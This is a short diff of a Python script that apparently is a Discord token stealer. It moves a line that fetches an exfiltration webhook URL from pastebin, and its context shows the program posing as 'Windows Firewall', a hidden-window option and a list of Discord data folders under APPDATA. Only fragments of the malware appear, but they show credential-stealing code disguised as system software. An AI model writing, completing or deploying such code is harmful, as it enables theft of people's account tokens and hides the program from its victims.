@@ -37,7 +37,6 @@ hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
 # Defining needed variables
-webhookURL = requests.get(pastebin).text
 path = path.join(
     environ["USERPROFILE"],
     "AppData",
@@ -52,6 +51,7 @@ myname = str(sys.argv[0])
 USER_NAME = getpass.getuser()
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
+webhookURL = requests.get(pastebin).text
 PATHS = {
     "Discord"           : ROAMING + "\\Discord",
     "Discord Canary"    : ROAMING + "\\discordcanary",
